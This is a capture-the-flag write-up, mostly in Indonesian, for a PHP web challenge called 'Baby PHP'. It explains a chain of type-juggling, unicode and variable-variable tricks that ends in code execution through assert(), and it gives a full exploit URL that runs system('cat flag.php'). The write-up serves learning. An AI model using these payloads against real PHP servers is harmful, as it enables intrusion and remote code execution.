# Baby PHP
---
**Points:** 109
**Solves:** 147/1035
**Category:** Web

PHP is a popular general-purpose scripting language that is especially suited to web development.

Fast, flexible and pragmatic, PHP powers everything from your blog to the most popular websites in the world.

[Can you untangle this mess?!](https://arcade.fluxfingers.net:1819/)
---

[Bahasa Indonesia](#bahasa-indonesia)

## English
TODO

## Bahasa Indonesia
Diberikan sebuah kode PHP seperti berikut:

```php
 <?php

require_once('flag.php');
error_reporting(0);


if(!isset($_GET['msg'])){
    highlight_file(__FILE__);
    die();
}

@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}

echo "Hello Hacker! Have a look around.\n";

@$k1=$_GET['key1'];
@$k2=$_GET['key2'];

$cc = 1337;$bb = 42;

if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}

if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}

list($k1,$k2) = [$k2, $k1];

if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}

$ b = "2";$a=" b";//;1=b

if($$a !== $k1){
    die("lel no\n");
}

// plz die now
assert_options(ASSERT_BAIL, 1);
assert("$bb == $cc");

echo "Good Job ;)";
// TODO
// echo $flag;   
```

Ada beberapa jebakan dalam soal ini. Pertama, perhatikan bahwa `preg_match('/^\d+＄/', $k2)` bukan menggunakan tanda dolar `$` melainkan `＄` atau karakter unicode untuk [full width dollar sign](http://graphemica.com/%EF%BC%84). Kedua, apabila kode sumber dituliskan menggunakan `highlight_file(__FILE__);` terlihat baris seperti ini:

![](trap.png)

Kode yang asli adalah `$ b = "2";$a=" b";//;1=b` menggunakan karakter unicode U+202E atau [right-to-left override](https://www.charbase.com/202e-unicode-right-to-left-override) pada nama variabel `$ b` dan juga pengisian `$a=" b"` sehingga ketika ditampilkan stringnya terbalik.

Tujuan kita adalah mencapai `echo "Good Job ;)";`. Terlihat bahwa terdapat `// echo $flag;` yang menandakan bahwa ada variabel bernama `$flag` tetapi tidak dituliskan ke output karena kode tersebut adalah komentar. Kita dapat memanfaatkan `assert("$bb == $cc");` untuk melakukan kontrol eksekusi kode apabila variabel `$bb` atau `$cc` dapat kita kontrol karena `assert` [melakukan evaluasi string seperti `eval`](http://php.net/manual/en/function.assert.php).

Variabel `$msg`, `$k1`, dan `$k2` dapat kita kontrol melalui GET `requests`. Apabila persyaratan memenuhi, kita juga dapat mengganti variabel `$cc` di tengah-tengah melalui `@$cc = $_GET['cc'];` dan juga membuat variabel dengan nama serta isi dari kita sendiri melalui `$$lel = $hack;` karena nilai dari `$lel` dan `$hack` diambil dari `foreach ($_GET as $lel => $hack)`.

Untuk mencapai *remote code execution*, berikut adalah beberapa hal yang harus dimanfaatkan dan dilakukan hingga mencapai `assert` dengan variabel yang kita kontrol.

### PHP Wrapper

```php
@$msg = $_GET['msg'];
if(@file_get_contents($msg)!=="Hello Challenge!"){
    die('Wow so rude!!!!1');
}
```

Selain *path* menuju berkas, fungsi `file_get_contents` juga dapat menerima [protokol dan *wrapper*](http://php.net/manual/en/wrappers.php). Sayangnya, sepertinya internet dimatikan sehingga `http://` menuju web yang kita kontrol yang berisi `Hello Challenge!` tidak dapat bekerja. Alternatifnya, kita dapat menggunakan [`data://`](http://php.net/manual/en/wrappers.data.php). Kita dapat menggunakan `msg=data://text/plain,Hello%20Challenge!` sebagai nilai dari `msg`.

### Strict Comparison

```
if(intval($k1) !== $cc || $k1 === $cc){
    die("lol no\n");
}
```

Perhatikan bahwa `$k1` diambil dari `$_GET['key1']` sehingga tipe data variabelnya adalah string. Perbandingan dengan variabel `$cc` menggunakan `strict comparison` (harus sama nilai dan tipe datanya). Variabel `$cc` berisi bilangan 1337 sehingga nilai dari $k1 bisa kita isi 1337. Perbandingan `$k1 === $cc` akan bernilai `false`.

### Loose Comparison

```php
if(strlen($k2) == $bb){
    if(preg_match('/^\d+＄/', $k2) && !is_numeric($k2)){
        if($k2 == $cc){
            @$cc = $_GET['cc'];
        }
    }
}

```

Variabel `$k2` tidak boleh berupa numerik tetapi harus sama dengan `$cc` yang berisi 1337. Perbandingan menggunakan `loose comparison` sehingga kita dapat mengisi `$k2` dengan string yang diawali 1337. Panjang string harus sesuai dengan nilai `$bb`, yaitu 42. Regex yang digunakan juga harus dipenuhi (ingat bahwa tanda dolar tersebut adalah jebakan, setelah 1337 kita harus memasukkan karakter unicode `＄`). Kita dapat menggunakan `1337%EF%BC%8400000000000000000000000000000000000` sebagai nilai `$k2` agar nilai `$cc` dapat kita kontrol.

### NULL Comparison

```php
if(substr($cc, $bb) === sha1($cc)){
    foreach ($_GET as $lel => $hack){
        $$lel = $hack;
    }
}
```

Nilai dari `$bb` adalah 42 dan variabel `$cc` dapat kita kontrol. Sepertinya sulit untuk memenuhi `substr($cc, $bb) === sha1($cc)` dengan cara biasa. Triknya adalah menggunakan array. Nilai dari `substr([], 42)` dan `sha1([])` adalah NULL sehingga perbandingan terpenuhi. Kita dapat mengatur nilai `$cc` menjadi array pada GET `request` sehingga kita dapat membuat variabel yang nama dan isinya dapat kita atur.

### Variable Variable

```php
$ b = "2";$a=" b";//;1=b

if($$a !== $k1){
    die("lel no\n");
}
```

Pada PHP, [*variable variable*](http://php.net/manual/en/language.variables.variable.php) dapat digunakan untuk pengambilan nilai dengan nama dinamis. Misal, pada contoh di atas, nilai dari `$$a` adalah `2`. Ingat bahwa sebelum `b` bukanlah spasi melainkan karakter unicode U+202E. Nilai dari `$k1` dapat kita kontrol melalui langkah sebelumnya sehingga cukup isi `$k1` dengan `2`.

### Remote Code Execution

```php
assert("$bb == $cc");
```

Variabel `$bb` dan `$cc` dapat kita kontrol tetapi `$cc` harus berupa array sehingga ketika dikonversi menjadi string akan bernilai `Array`. Sintaks yang digunakan harus benar sementara `== Array` akan menghasilkan `syntax error` ketika evaluasi. Triknya adalah menggunakan `;` dan komentar `//` pada `$bb`. Kita dapat menjalankan kode PHP apa saja. Untuk melakukan `remote code execution`, kita dapat menggunakan fungsi seperti `system`. Contoh, untuk membaca berkas `flag.php`, nilai `$bb` dapat kita isi dengan `system('cat flag.php'); // `.

### Final Exploit

Berikut adalah salah satu `request` yang dapat dilakukan untuk mendapatkan flag.

[view-source:https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=1337%EF%BC%8400000000000000000000000000000000000&cc[]=a&k1=2&bb=system(%27cat%20flag.php%27);%20//%20%22](view-source:https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&key1=1337&key2=1337%EF%BC%8400000000000000000000000000000000000&cc[]=a&k1=2&bb=system(%27cat%20flag.php%27);%20//%20%22)
